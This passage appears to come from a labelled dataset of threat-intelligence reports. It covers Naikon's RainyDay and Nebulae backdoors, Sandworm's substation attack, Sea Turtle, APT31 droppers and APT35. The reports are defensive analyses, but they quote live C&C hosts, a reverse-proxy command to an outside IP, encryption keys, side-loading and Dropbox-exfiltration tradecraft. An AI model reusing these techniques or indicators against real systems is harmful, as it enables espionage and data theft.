section, technical details about the toolset used in the kill chain will be provided. Using the RainyDay backdoor, the actors performed reconnaissance, uploaded its reverse proxy tools and scanners, executed the password dump tools, performed lateral movement, achieved persistence, all to compromise the victims’ network and to get to the information of interest. The following diagram illustrates the toolset used by the RainyDay Backdoor:The persistence mechanism is usually installed manually, as the actor tends to mimic legitimate applications, but in some cases, it is automatically set by the binaries themselves. The intention to hide through the legitimate software was observed during the deployment of exfiltration tools – the sbiedll.dll tool is used to automatically collect files with a given extension and to upload them to Dropbox; the tool masquerading itself as a chrome process. The second backdoor, that we call Nebulae, is supposedly used as a measure of precaution to not lose the persistence in case any signs of infections gets detected. For lateral movement, WMIC.exe and schtasks.exe with admin domain credentials were used, a strong indicator that credentials were stolen at some point during the attack. During the investigation, we observed a particular technique to be extensively used for tool execution, namely Side-Loading. This technique was always used for RainyDay execution and there was always a vulnerable executable along with a DLL file and the rdmin.src file containing the encrypted backdoor payload. We also noticed 2 flows of execution of the RainyDay backdoor, one of which is the execution of a SFX file that drops all 3 files in a temporary folder:The SFX file used in the operation contains the legitimate Mobile Popup Application from Quick Heal AntiVirus, the DLL file pc2msupp.dll that extracts the payload from rdmin.srcAnother side-loading triad used by the actor was the Outlook Item Finder and the outllib.dll that obtains the payload from rdmin.src. After the malicious DLL file is loaded, it changes the flow of the legitimate executable to run code that reads the content of the rdmin.src file, decrypts the shellcode by XOR-ing the content with the value of 0x7A, and finally, executes the shellcode. The result is the presence of the RainyDay in memory. If visualizing the RainyDay memory dump, available on VirusTotal in a hex viewer it’s easy to observe the config section that appears to be obfuscated by XOR-ing with the 0x2D value. After decryption the config looks as shown in the image below.At a glance, the configuration data contains the C&C address, a folder name, a service description, a mutex name and a service name, all this information being confirmed during the analysis. As shown in the image, the C&C address of the RainyDay extracted from the SFX sample is cat.suttiphong.com. Next step taken was collecting more rdmin.src samples from our file collection, which led us to more RainyDay The story behind the Nebulae tool started after the analysis of a process tree of the RainyDay process. The data revealed a process executed by the previously described backdoor with the following file path - C:\\windows\\help\\help\\ dwm.exe. Further analysis revealed that the binary has backdoor capabilities. By clustering more suspected similar binaries, we observed a pattern for a few of them – the Nebulae string appears as the ExportName of the file. Moreover, we found a similar sample with the following pdb path - C:\\Projects\\New\\ ne\\NebulaeForPool_ConfigEXE - Explorer__1\\Release\\Nebulae.pdb and all those facts inspired us to call the tool Nebulae. In this operation, the Nebulae backdoor appears in the form of executable, as well as DLL file, the last form being used mostly for side-loading technique. A particular example of an abused file is the VirusScan On-Demand Scan Task Properties：There are more exploited executables used for the Nebulae loading as we found a sample that exports 2 particular functions, StartUserModeBrowserInjection and StopUserModeBrowserInjection, indicating that the actors try to impersonate the chrome_frame_helper.dll. The analysis of the most recent samples showed that the backdoor is capable of：Communication with the C&C is realized by sending and receiving packets of a fixed form through a TCP connection. The format of packets can be visualized on the diagram below and represent an array of bytes of dynamic length with a 77 bytes header that stores the RC4 key used for payload encryption (the key is created by concatenating each fourth byte): The address of C&C is encrypted using XOR operation with the key value set to the length of the string. This method of encrypting the C&C address is the same in the almost all samples of Nebulae we were able to collect – the single exception being an old sample – 3b9629122f33d5f354026923fdd3e499f43b01054c3dc74224aa242a4dd397c1, in which the C&C address is XOR-ed with the 0x3b value. The persistence installation for a Nebulae sample was captured in a process tree of a RainyDay process, where the latter executes the following command line:Another artifact showing more details about the Nebulae persistence is a binary we found having the %PROGRAM_ FILES_COMMON%\\system\\ado\\dll.exe file path that creates a service dot1 with the “Windows Update Agent1” as DisplayName that is set to load the %SYSWOW64%\\dot1.dll file. The identified dot1.dll file is a Nebulae sample that exports the ServiceMain function. The data we obtained so far tell almost nothing about the role of the Nebulae in this operation, but the presence of a persistence mechanism could mean that it is used as backup access point to victim in the case of a negative scenario for actors.The legitimate SandboxieBITS.exe file and the malicious file collector sbiedll.dll were found in the C:\\Program Files (x86)\\Google\\Chrome\\ directory under the names Chrome.exe and sbiedll.dll, respectively. The tool collects recently changed files with a specific extension and uploads them to Dropbox. So, the specific directory and the file names were chosen in order to mask the traffic to Dropbox as originating from a legitimate source and subsequently, to fly under the radar. The sbiedll.dll exports two functions, SbieApi_Log and SbieDll_Hook, that matches the static imports for the SandboxieBITS.exe binary, the SbieDll_Hook being the entrypoint of the exfiltration tool. Once loaded, the tool tries to assign to the registry key value named contom under the Run key the file path of the executable In order to achieve persistence via Registry keys. Next steps during the execution correspond to the start of two decoupled components that run in separated threads: the collection component and the uploading component. The uploading component is responsible for periodic listing of the C:\\ProgramData\\Adobe\\temp folder and for uploading the found files to Dropbox using the public HTTP API. The credentials for the Dropbox account are encrypted in the binary along with the remote path. Another particularity of the upload module consists of encrypting the content of files with AES128-CBC using the “1234567890123459” value for key and IV. The entire logic is implemented in a window procedure tied to a window named WindowsProject1 as the developers preferred to use the SetTimer function in combination with the WM_TIMER window event for periodic uploading. The upload may occur at a specific time of the day if there is a file named LICENSE in the root directory of the Dropbox. The file contains strings that indicates the hours when to upload the collected files and such content looks like the one presented below:Another tool suspected to be used for data exfiltration is swissfileknife binary that is available for public download from the osdn.net site. Despite the fact that there is evidence that RainyDay executes this tool multiple times, we can only assume that it was used for exfiltration as per the available description of command line parameters.The evidences we collected show that there was used at least one tool for password dumping. One file we found at C:\\PerfLogs\\p8.exe is a sample of QuarksPwDump that certainly was used by RainyDay in order to obtain local passwords and domain cached credentials. In C:\\ProgramData\\ folder, two other tools are found and their purpose is to collect browser credentials. The files we referred to are:During the investigation we identified a netbios scanner, multiple samples of the Ladon scanner and two different types of proxy tools used in the operation. And all these tools contribute to the generation of a broader overview of the infrastructure used by actors. The netbios scanner has different file paths:It was used for network inspection and for machine identification by scanning the private IP range X.X.0.0/24. This discovery step is particularly interesting as it characterizes how the actor behaves - immediately after the execution of the scanner, we noticed the execution of net.exe and ping.exe tools, which were probably used for checking if a machine is up and running. Further actions correspond to the lateral movement step by running a command using wmic.exe on a remote machine. Other tool used by RainyDay is boost_proxy_client, called so because of use of the C++ boost libraries and because of the pdb path found in a sample. We obtained 2 samples of the tool located at:Yet another reverse proxy tool from the actor’s arsenal is the Go-written tool RcSocks v1.0. We were able to collect 2 samples of this type: %COMMON_APPDATA%\\adobe\\scupdate.exe %WINDOWS%\\csc\\winsrvc.exe, where scupdate. exe was executed by an instance of Rainyday with the “scupdate -c 124.156.241.24:8550” command line. Speaking of tools written in Go, another one pops on the radar and this time it is a scanner known as LadonGo. The file Our research confidently points to an operation conducted by the Naikon group based on the extraction of the C&C addresses from Nebulae samples. The particular domain dns.seekvibega.com obtained from such a sample points out to the Naikon infrastructure, as previously documented in a CheckPoint research. Moreover, several C&C addresses in the same component are suspected by ThreatConnect to belong to the Naikon infrastructure (e.g. www.wahatmrjn. com). We found more compelling evidence ito support our hypothesis during the triage of the suspicious files. The results of this process are the identification of a new case of side-loading and three malicious files (obtained from the same machine where we noticed RainyDay and other IOCs) belonging to Aria-Body loader malware family, the family that was previously reported to be used by Naikon:The C&C addresses of two of aria-body loader samples are rose.twifwkeyh.com and guinnbandesh.com as the third sample uses an IP from a private range. Despite the fact that we don’t have any visibility into what these samples of Aria-Body loader executed, they are certainly connected with the operation we investigated, as there is a sample of Nebulae with the osde.twifwkeyh.com C&C address that uses a subdomain of the same domain twifwkeyh.com. The previously mentioned Nebulae sample was used by the actor, as it was observed to be used in this operation together with outllib.dll that loads the RainyDay backdoor.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "In late 2022, Mandiant responded to a disruptive cyber physical incident in which the Russia-linked threat actor Sandworm targeted a Ukrainian critical infrastructure organization. This incident was a multi-event cyber attack that leveraged a novel technique for impacting industrial control systems (ICS) / operational technology (OT). The actor first used OT-level living off the land (LotL) techniques to likely trip the victim’s substation circuit breakers, causing an unplanned power outage that coincided with mass missile strikes on critical infrastructure across Ukraine. Sandworm later conducted a second disruptive event by deploying a new variant of CADDYWIPER in the victim’s IT environment. This attack represents the latest evolution in Russia’s cyber physical attack capability, which has been increasingly visible since Russia’s invasion of Ukraine. The techniques leveraged during the incident suggest a growing maturity of Russia’s offensive OT arsenal, including an ability to recognize novel OT threat vectors, develop new capabilities, and leverage different types of OT infrastructure to execute attacks. By using LotL techniques, the actor likely decreased the time and resources required to conduct its cyber physical attack. While Mandiant was unable to determine the initial intrusion point, our analysis suggests the OT component of this attack may have been developed in as little as two months. This indicates that the threat actor is likely capable of quickly developing similar capabilities against other OT systems from different original equipment manufacturers (OEMs) leveraged across the world. We initially tracked this activity as UNC3810 before merging the cluster with Sandworm. Sandworm is a full-spectrum threat actor that has carried out espionage, influence and attack operations in support of Russia's Main Intelligence Directorate (GRU) since at least 2009. The group's long-standing center focus has been Ukraine, where it has carried out a campaign of disruptive and destructive attacks over the past decade using wiper malware, including during Russia's re-invasion in 2022. Beyond Ukraine, the group continues to sustain espionage operations that are global in scope and illustrative of the Russian military's far-reaching ambitions and interests in other regions. Government indictments have linked the group to the Main Center for Special Technologies (also known as GTsST and Military Unit 74455). Given Sandworm’s global threat activity and novel OT capabilties, we urge OT asset owners to take action to mitigate this threat. We include a range of detections, hunting and hardening guidance, MITRE ATT&CK mappings and more in the appendices of this blog post.Based on our analysis, the intrusion began on, or prior to, June 2022 and culminated in two disruptive events on October 10 and 12, 2022. While we were unable to identify the initial access vector into the IT environment, Sandworm gained access to the OT environment through a hypervisor that hosted a supervisory control and data acquisition (SCADA) management instance for the victim’s substation environment. Based on evidence of lateral movement, the attacker potentially had access to the SCADA system for up to three months. On October 10, the actor leveraged an optical disc (ISO) image named “a.iso” to execute a native MicroSCADA binary in a likely attempt to execute malicious control commands to switch off substations. The ISO file contained at least the following: “lun.vbs”, which runs n.bat “n.bat”, which likely runs the native scilc.exe utility “s1.txt”, which likely contains the unauthorized MicroSCADA commands Based on a September 23 timestamp of “lun.vbs”, there was potentially a two-month time period from when the attacker gained initial access to the SCADA system to when they developed the OT capability. Although we were not able to fully recover the ICS command execution implemented by the binary, we are aware that the attack resulted in an unscheduled power outage. Figure 1 contains a visualization of the execution chain resulting in the disruptive OT event.Two days after the OT event, Sandworm deployed a new variant of CADDYWIPER in the victim’s IT environment to cause further disruption and potentially to remove forensic artifacts. However, we note that the wiper deployment was limited to the victim’s IT environment and did not impact the hypervisor or the SCADA virtual machine. This is unusual since the threat actor had removed other forensic artifacts from the SCADA system in a possible attempt to cover their tracks, which would have been enhanced by the wiper activity. This could indicate a lack of coordination across different individuals or operational subteams involved in the attack. A deeper dive on the attack lifecycle and OT capability can be found in the Technical Analysis section of the blog post.Sandworm’s substation attack reveals notable insights into Russia’s continued investment in OT-oriented offensive cyber capabilities and overall approach to attacking OT systems. This incident and last year’s INDUSTROYER.V2 incident both show efforts to streamline OT attack capabilities through simplified deployment features. We observed the same efforts in our analysis of a series of documents detailing project requirements to enhance Russian offensive cyber capabilities. Similarly, the evolution of suspected GRU-sponsored OT attacks shows a decrease in the scope of disruptive activities per attack. The 2015 and 2016 Ukraine blackout events each featured several discrete disruptive events against the OT environment (e.g., disabling UPS systems, bricking serial-to-ethernet converters, conducting a DoS attack against a SIPROTEC relay, wiping OT systems, etc.). By comparison, the INDUSTROYER.V2 incidents lacked many of those same disruptive components and the malware did not feature the wiper module from the original INDUSTROYER. Likewise, Sandworm’s activity in the OT network appears streamlined to only executing unauthorized ICS command messages, with the wiper activity limited to the IT environment. While this shift likely reflects the increased tempo of wartime cyber operations, it also reveals the GRU’s priority objectives in OT attacks. Sandworm’s use of a native Living off the Land binary (LotLBin) to disrupt an OT environment shows a significant shift in techniques. Using tools that are more lightweight and generic than those observed in prior OT incidents, the actor likely decreased the time and resources required to conduct a cyber physical attack. LotLBin techniques also make it difficult for defenders to detect threat activity as they need to not only remain vigilant for new files introduced to their environments, but also for modifications to files already present within their installed OT applications and services. As outlined in recent research detailing the GRU's disruptive playbook, we have observed Sandworm adopting LotL tactics across its wider operations to similarly increase the speed and scale at which it can operate while minimizing the odds of detection. While we lack sufficient evidence to assess a possible link, we note that the timing of the attack overlaps with Russian kinetic operations. Sandworm potentially developed the disruptive capability as early as three weeks prior to the OT event, suggesting the attacker may have been waiting for a specific moment to deploy the capability. The eventual execution of the attack coincided with the start of a multi-day set of coordinated missile strikes on critical infrastructure across several Ukrainian cities, including the city in which the victim was located.This attack represents an immediate threat to Ukrainian critical infrastructure environments leveraging the MicroSCADA supervisory control system. Given Sandworm's global threat activity and the worldwide deployment of MicroSCADA products, asset owners globally should take action to mitigate their tactics, techniques, and procedures against IT and OT systems. Furthermore, our analysis of the activity suggests Russia would be capable of developing similar capabilities against other SCADA systems and programming languages beyond MicroSCADA and SCIL. We urge asset owners to review and implement the following recommendations to mitigate and detect this activity.At this time, it is unknown how Sandworm gained initial access to the victim. Sandworm was first observed in the victim’s environment in June 2022, when the actor deployed the Neo-REGEORG webshell on an internet-facing server. This is consistent with the group’s prior activity scanning and exploiting internet facing servers for initial access. Roughly one month later, Sandworm deployed GOGETTER, which is a tunneler written in Golang that proxies communications for its command and control (C2) server using the open-source library Yamux over TLS. When leveraging GOGETTER, Sandworm utilized a Systemd service unit to maintain persistence on systems. A Systemd service unit allows for a program to be run under certain conditions, and in this case, it was used to execute the GOGETTER binary on reboot.The Systemd configuration file leveraged by Sandworm enabled the group to maintain persistence on systems. The value “WantedBy” defines when the program should be run; in the configuration used by Sandworm, the setting “multi-user.target” means that the program will be run when the host has reached a state when it will accept users logging on, for example after successful power on. This enables GOGETTER to maintain persistence across reboots. The “ExecStart” value specifies the path of the program to be run, which in this case was GOGETTER.When deploying GOGETTER, Mandiant observed Sandworm leverage Systemd service units designed to masquerade as legitimate or seemingly legitimate services. Sandworm utilized a novel technique to impact the OT environment by executing code within an End-of-Life (EOL) MicroSCADA control system and issuing commands that impacted the victim’s connected substations. Table 1 summarizes the malicious files containing the new OT capability. We note that given the attacker’s use of anti-forensics techniques, we were not able to recover all the artifacts from the intrusion. To impact the OT systems, Sandworm accessed the hypervisor that hosted a SCADA management instance for the victim’s substation environment and leveraged an ISO image named “a.iso” as a virtual CD-ROM. The system was configured to permit inserted CD-ROMs to autorun. The ISO file, at minimum, contained the following files: “lun.vbs” and “n.bat” as both files are referenced within the D volume and therefore contained within “a.iso”. The inserted ISO led to at least the following command lines execution: wscript.exe “d:\\pack\\lun.vbs” cmd /c “D:\\pack\\n.bat” .The contents in Figure 6 indicate that “lun.vbs” executes “n.bat”. Additional fragments recovered include text consistent with Windows command line execution (Figure 7). This fragment was identified by analyzing images from the host. Reconstruction of the host’s anti-virus logs indicates “lun.vbs” and “n.bat” were executed in close time proximity. Because of this and the reference to the attacker’s ISO folder path, we believe that the command fragment in Figure 7 is likely the contents of “n.bat”.The syntax of the command fragment includes “scilc.exe”, a native utility that is part of the MicroSCADA software suite. The utility is located in the “\\sc\\prog\\exec” folder within the MicroSCADA installation directory, amongst other utilities, libraries, and resources used by MicroSCADA. The impacted MicroSCADA system was running an EOL software version that allowed default access to the SCIL-API. The “-do” flag specifies a SCIL program file to execute (Figure 8). Lastly, the command supplies a file named “s1.txt” in the “pack\\scil\\” folder of the attacker's ISO. We assess “pack\\scil\\s1.txt” is likely a file containing SCIL commands the attackers executed in MicroSCADA. This file was unrecoverable at the time of analysis.According to Hitachi Energy’s documentation, SCIL is a high level programming language designed for MicroSCADA control systems and can operate the system and its features (Figure 9). SCIL programs are generally text-based statements that can be composed of commands, objects, variables, calls to predefined functions, and expressions. There are several methods in which SCIL programs can execute, such as an engineer/operator clicking a button or image within the MicroSCADA system, scheduled or process derived changes, or in this case manual execution.While we were unable to identify the SCIL commands executed, we believe they were probably commands to open circuit breakers in the victim’s substation environments. The SCIL commands would have caused the MicroSCADA server to relay the commands to the substation RTUs via either the IEC-60870-5-104 protocol for TCP/IP connections or the IEC-60870-5-101 protocol for serial connections. Sandworm Deployed New CADDYWIPER Variant to Further Disrupt the Victim’s IT Environment Two days following the OT activity, Sandworm deployed a new variant of CADDYWIPER throughout the IT environment. This CADDYWIPER variant, compiled in October 2022, contains some minor functionality improvements that allow threat actors to resolve functions at runtime. We have observed CADDYWIPER deployed across several verticals in Ukraine, including the government and financial sectors, throughout Russia’s invasion of Ukraine. CADDYWIPER is a disruptive wiper written in C that is focused on making data irrecoverable and causing maximum damage within an environment. CADDYWIPER will attempt to wipe all files before proceeding to wipe any mapped drives. It will then attempt to wipe the physical drive partition itself. Notably, CADDYWIPER has been the most frequently used disruptive tool against Ukrainian entities during the war and has seen consistent operational use since March 2022, based on public reporting. We have observed Sandworm utilize CADDYWIPER in disruptive operations across multiple intrusions. Sandworm deployed CADDYWIPER in this operation via two Group Policy Objects (GPO) from a Domain Controller using TANKTRAP. TANKTRAP is a utility written in PowerShell that utilizes Windows group policy to spread and launch a wiper. We have observed TANKTRAP being used with other disruptive tools including NEARMISS, SDELETE, PARTYTICKET, and CADDYWIPER. These group policies contained instructions to copy a file from a server to the local hard drive and to schedule a task to run the copied file at a particular time.Both TANKTRAP GPOs deployed CADDYWIPER from a staged directory to systems as msserver.exe. CADDYWIPER was then executed as a scheduled task at a predetermined time. In this incident, the attacker leveraged an EOL version of the MicroSCADA supervisory control system. The SCIL-API interface in MicroSCADA has been disabled-by-default since the release of MicroSCADA 9.4 in 2014. If required to continue using the interface, asset owners can refer to MRK511518 MicroSCADA X Cyber Security Deployment Guideline on how to harden the MicroSCADA. Please contact the Hitachi Energy MicroSCADA support team to obtain the documentation. We note that the MicroSCADA control system became a Hitachi Energy product in 2022 after a divestiture from ABB. Asset owners should reference both vendors in asset inventories and manual asset inspections to determine if the product is present in any OT environments. Harden MicroSCADA and other SCADA management hosts: Update MicroSCADA to supported versions. Configure MicroSCADA to require authentication and establish a least privilege design for user permissions. Establish robust network segmentation between MicroSCADA hosts and IT networks. Enable robust application logging for MicroSCADA and aggregate logs to a central location. If/where feasible, configure the base system in “read-only” mode and ensure no external SCIL-API programs (such as scilc.exe) are allowed. Consult with OEMs for installed SCADA software to identify similar methods of code execution within their software and to obtain guidance on mitigations. Monitor MicroSCADA systems and other SCADA management systems for: Command-line execution of MicroSCADA “Scilc.exe” binary and other native MicroSCADA binaries that may be leveraged to execute unauthorized SCIL program/commands. Network traffic and process related telemetry to/from host(s) operating the MicroSCADA software. Investigate anomalous activity and correlate findings with process telemetry. Files transferred or moved onto MicroSCADA hosts. Newly created files with MicroSCADA or SCIL programming language references. Unauthorized changes in MicroSCADA system configuration and data.\n\n\n",

        "explain": "Researchers from Dutch security firm Hunt & Hackett observed Sea Turtle cyber espionage group (aka Teal Kurma, Marbled Dust, SILICON and Cosmic Wolf) targeting telco, media, ISPs, IT service providers, and Kurdish websites in the Netherlands. The researchers believe that the Turkey-linked APT Sea Turtle has been active since at least 2017. The Sea Turtle APT group focuses primarily on targeting organizations in Europe and the Middle East. Between 2017 and 2019, the APT group mainly used DNS hijacking in its campaigns. The group targets government entities, Kurdish (political) groups like PKK, telecommunication, ISPs, IT-service providers (including security companies), NGO, and Media & Entertainment sectors; Over the years, the group enhanced its evasion capabilities. In October 2021, Microsoft observed the group conducting intelligence gathering aligned with strategic Turkish interests. In recent attacks, the researchers targeted the infrastructure of the targets with supply chain and island-hopping attacks. The threat actors gathered personal information on minority groups and potential political dissents. “The stolen information is likely to be exploited for surveillance or intelligence gathering on specific groups and or individuals.” reads the report published by Hunt & Hackett. “This appears to be consistent with claims from US officials in 2020 about hacker groups acting in Turkey’s interest, focusing on the identities and locations of the victims, which included governments of countries that are geopolitically significant to Turkey” The modus operandi of the group includes intercepting internet traffic to victim websites, and potentially granting unauthorized access to government networks and other organizations. During one of the most recent campaigns in 2023, the APT group employed a reverse TCP shell named SnappyTCP to target Linux/Unix systems. Sea Turtle also used code from a publicly accessible GitHub account, which is likely under the control of the threat actor. The researchers also observed the cyber spies compromising cPanel accounts and using SSH to achieve initial access to the environment of a target’s organization. Hunt & Hackett also observed the threat actor collecting at least one e-mail archive, of one of the multiple victim organizations.\n\n\n",

                "content": "\"You can imagine that an attacker aligning with Turkish political interests has significant interest in where the dissident Kurds are in Europe,\" warns one member of the Hunt & Hackett research team, who chose to remain anonymous for this story. A group aligned with the interests of the government of Turkey has been turning up its politically motivated cyber espionage lately, targeting Kurdish opposition groups through high-value supply chain targets in Europe, the Middle East, and North Africa.

        "original_label": "true",
        "label": "true",
        "explain": "PT Expert Security Center (PT ESC) specialists regularly track the activity of hacker groups and the emergence of new information security threats (threat intelligence). During such monitoring in April 2021, a mailing list with previously unknown malicious content was sent to Mongolia. Some of the files found during the study had rather interesting names (“хавсралт.scr” [“havsralt.scr”] (mong. attachment), “Информация_Рб_июнь_2021_года_2021062826109.exe”) and, as the study showed, they contained a remote access trojan (RAT). Similar attacks were subsequently identified in Russia, Belarus, Canada, and the United States. According to PT ESC threat intelligence analysts, from January to July 2021, approximately 10 attacks were carried out using the discovered malware samples. A detailed analysis of malware samples, data on the paths on which working directories and registry keys were located, techniques and mechanisms used by the attackers (from the injection of malicious code to the logical blocks and structures used) helped correlate this malware with the activity of the APT31 group. This group, also known as Judgment Panda (CrowdStrike) and Zirconium (Microsoft), has been active since at least 2016. The group is presumed to be of Chinese origin, providing data to the Chinese government and state-owned enterprises to achieve political, economic, and military advantages. Cyberespionage is of key interest. The attackers' targets include the government sector, aerospace and defense enterprises, as well as international financial companies and the high-tech sector. In different years, the group's victims have included the government of Finland and, it is presumed, the governments of Norway and Germany too. The group also attacked organizations and individuals close to U.S. presidential candidates during the 2020 campaign. Recent attacks on companies in France, involving the hacking of home and office routers, have also been linked with the group. In this article, we will study the malware created by the group, focus in more detail on the types of droppers discovered and the tricks used by its developers. We will also present the criteria on the basis of which the attacks were attributed. The main objective of the dropper, the appearance of the main function of which is shown in Figure 1, is the creation of two files on the infected computer: a malicious library and an application vulnerable to DLL Sideloading (this application is then launched). Both files are always created over the same path: C:\\ProgramData\\Apacha. In the absence of this directory, it is created and the process is restarted. At the second stage, the application launched by the dropper loads the malicious library and calls one of its functions. It is noteworthy that MSVCR100.dll was chosen as the name of the malicious library in all cases. A library with an identical name is included in Visual C ++ for Microsoft Visual Studio. It is available on almost all PCs, but in a legitimate case it is located in the System32 folder (Figure 2). Moreover, the size of the malicious library is much smaller than the legitimate one.It is also worth noting the trick of the malware developers: by way of exports, the library contains names that can be found in the legitimate MSVCR100.dll. Without a doubt, this was done to make the malicious library as identical to the original version as possible. However, the number of exports in the malicious sample is much smaller, and most of them are ExitProcess calls. Below is an example of a call to a malicious function from the created library. After the call, control is transferred to the malicious code. Note that the names of malicious functions were most often those used during the regular loading of applications.During the analysis of malware samples, PT ESC specialists detected different versions of droppers that contain the same set of functions. The main difference is the name of the directory in which the files contained in the dropper will be created. However, in all the instances studied, the directories found in C:\\ProgramData\\ were used. The version of the dropper that downloads all files from the control server is worthy of particular note. Let's take a closer look. At the first stage, the presence of a working directory is also checked, after which connection is made to the control server and the necessary data is downloaded from it.Execution commences with receipt of a list of launched processes. That said, this has no impact on anything and is not used anywhere. The library then checks for the presence of the file C:\\ProgramData\\Apacha\\ssvagent.dll. This is the encrypted main load downloaded from the server. If this file does not exist, then the address of the control server from which the download will be performed is decrypted. In fact, this is a 5-byte XOR with a key built into the library. Inside the binary file, the key is stored in the form xmmword with the constant 9000000090000000900000009h (the fifth byte is added to the memory by the malware itself using the direct address). In fact, encryption is performed with byte 0x9. After decrypting the C2 address, it connects to the control server and downloads the encrypted payload from it. Then the received data is saved in the file C:\\ProgramData\\Apacha\\ssvagent.dll, and the legitimate application ssvagent.exe is restarted. The main part of the described functions is presented in Figure 11.If the payload has been loaded earlier, it is checked for an application that is already running. To do this, a mutex named ssvagent is created; if it has been created, the application ends. The library then writes the legitimate ssvagent.exe to startup via the registry, as shown in Figure 12.After this, the file downloaded from the server is decrypted using a XOR operation with a 5-byte key. (The algorithm and key shown in Figure 10 differ from those used when decrypting the address of the control server.) Just as when decrypting the address of the control server, the key is stored in the form xmmword and is a constant: 1100000033000000060000000Eh. The fifth byte is identical in all cases; its value is 0x12. The values of const_1 and const_2 are identical and remain unchanged from package to package (unit value equalized to 4 bytes value). To generate a hash, which is preceded by the main heading, the malware obtains the MAC address and PC name (the result of executing GetComputerNameExW). These values are concatenated (without using any separators), after which an MD5 hash is taken from the resulting value, which is then converted into a string. An example of hash generation is presented in Figure 14.Heading fields decrStr_1 through decrStr_4 are not generated by the malware and are not collected on the infected computer. All values are encrypted inside the malware. Each value is decrypted separately and is added to the heading. The decrStr_4 field depends on the bitness of the operating system, which ultimately leads to different offsets of the encrypted data transferred to the decryption function (Figure 17) as an argument. The format of a complete generated package is presented below. The main heading is highlighted in green; the hash, in red; the encrypted data, in yellow.It is noteworthy that some of them duplicate each other's functions, and some are identical in terms of code implementation. This is most likely connected with the fact that the potential malware version is 1.0. This assumption is based on the value embedded in the code and contained in the network packages. The code for processing the last command is particularly intriguing: all the created files and registry keys are deleted using a bat-file.During their investigation, PT ESC specialists found a Secureworks report describing the APT31 DropboxAES RAT trojan. Analysis of the detected malware instances allows us to assert that the group is also behind the attack we studied. Numerous overlaps were found in functionality, techniques and mechanisms used, starting with the injection of malicious code (up to the names of the libraries used) and ending with logical blocks and structures used inside the program code. The paths along which the malware working directories are located and the registry keys through which the persistence mechanism and their identity to the working directories are provided are also identical. In addition, the command handlers executed by the malware proved to be extremely similar, while the self-delete mechanism is identical. The main difference between this version of the malware and that reviewed by Secureworks lies in the communication of the main load with the control server. In the cases studied, there was a custom communication protocol that Dropbox does not use to exchange data.In the study PT ESC specialists analyzed new versions of the malware used by APT31 in attacks from January to July this year. The revealed similarities with earlier versions of malicious samples described by researchers, such as in 2020, suggest that the group is expanding the geography of its interests to countries where its growing activity can be detected, Russia in particular. We believe that further instances will be revealed soon of this group being used in attacks, including against Russia, along with other tools that might be identified by code correspondence or network infrastructure.\n\n\n",

        "explain": "The Iranian advanced persistent threat actor and cyberespionage group, APT35, also known as Charming Kitten or Phosphorus, has been making headlines since 2014. During that time, the group launched one of the most sophisticated internet based spying campaigns organized by Iranian threat actors – a campaign conducted via social media. Since then, the group has not slowed down and has been responsible for several other cyber attacks around the world. In 2019, APT35 was responsible for targeting several academic institutions in the U.S, France, and the Middle East region. In late 2020, the group targeted medical research organizations in Israel and in the U.S. By 2021, APT35 was abusing Microsoft Exchange Server vulnerabilities that were chained together (ProxyShell). As of 2022, APT35 has been observed using new tactics to attack a wide range of targets. Using a new strain of malware, the threat actors were able to use the malware for intelligence collection. The group has also been seen using a new tool called Hyperscrape to quietly extract emails from victim’s mailboxes. Let’s take a look at APT35, their tactics and techniques, and what a tool like Hyperscrape can do for an advanced persistent threat actor like APT35.As previously mentioned, Charming Kitten has been on the radar of the infosec community since 2014 despite being active since 2013. Over the past few months, the Cybereason Nocturnus Team has observed an uptick in activity from the Iranian APT. Charming Kitten was previously known for attacking medical research organizations in the U.S. and in Israel, using malicious PDFs to lure their victims and they have continued to include the medical sector in their attacks. In 2020, researchers discovered Charming Kitten targeting a small but specific group of people in the medical research field – particularly oncology, genetics, and neurology. The threat actors used a spear-phishing technique and sent emails to their victims with the subject line “Nuclear Weapons at a Glance: Israel.” The emails contained information about Israel’s nuclear capabilities and a link to a malicious website which was controlled by the threat actors. Once the victim clicked on the email, they were taken to a phishing page that asked them to enter their Microsoft OneDrive credentials. The campaign was known as “BadBlood” and was highly targeted – a typical campaign for APTs in general. It is not unusual for Charming Kitten’s phishing campaigns to target a select number of people, but it is unusual for Iranian APTs as a whole. It is suspected that Charming Kitten is associated with Iran’s Islamic Revolutionary Guard Corps due to the group’s targeting and collection aligning with the entity. In 2019, Microsoft’s Digital Crimes Unit took over the infrastructure of APT35. At the time, APT35 was responsible for spear-phishing campaigns against several individuals and organizations (activists, journalists, defense companies, etc.). The takedown included a court order for Microsoft to assume control of 99 domains that belonged to APT35 and that the group used during their phishing campaigns. Most of the domains looked as if they belonged to Microsoft or other legitimate technology companies. The emails associated with the campaigns contained links that eventually lead to the installation of malware and the domains were used as a part of the command-and-control infrastructure of the group. In addition to attacking journalists and medical professionals, APT35 has used their malware to gain entry into computer systems for businesses and government agencies to steal sensitive information. However, the group especially had an interest in activists and journalists involved in advocacy and reporting on issues in the Middle East. APT35 is still active despite the 2019 takedown, and in February 2022, the group was seen using a new toolset that included a novel backdoor, malware loaders, a browser info stealer, and a keylogger. They were also seen using open-source tools such as the DiskCryptor library, BitLocker, and Fast Reverse Proxy. APT35 was seen deploying a new PowerShell Backdoor called PowerLess Backdoor and they were using a stealthy technique to avoid detection. The PowerShell Backdoor was being run in a .NET context instead of spawning the PowerShell process. The PowerLess Backdoor supports the following capabilities:While analyzing, security experts from Cybereason noticed several grammatical mistakes in the backdoor’s code, suggesting that English was likely not the native language of the backdoor’s authors. Cybereason also found links between the APT35 and Momento Ransomware – a ransomware group that initially appeared in 2021. Momento exploited CVE-2021-21972 – a VMware vCenter Server vulnerability that could be exploited by remote attackers without user interaction. There were several similarities between the TTPs used by APT35 and Momento ransomware, such as shared URL directory patterns and similar file naming schemes. According to Sophos, Momento ransomware features a unique failsafe mechanism that locks files inside password-protected WinRAR archives. This is done in case the main file encryption operation fails. Iranian groups such as APT35, typically operate as contractors on behalf of the Iranian government and scan the web for popular servers that may be vulnerable due to undisclosed vulnerabilities. Once they find the vulnerable servers, they gain control over unpatched systems. If the compromised networks are of interest to the Iranian government, the threat actor will deploy malware and glean information from the compromised systems – ensuring that they maintain persistence for future collection efforts. If the target doesn’t have value, APT35 will sell access to the target’s systems on underground forums, or the target will be monetized for the threat actor.In January 2022, APT35 was seen exploited the Log4Shell/Log4j security vulnerability, seeing it as a new opportunity to strike before organizations patched their affected systems. When Log4Shell emerged, researchers observed the threat actor performing widespread scans just four days after the vulnerability was disclosed. At the tail end of December 2021, Log4Shell took cyberspace by surprise and had cybersecurity professionals panicking. Log4Shell is a 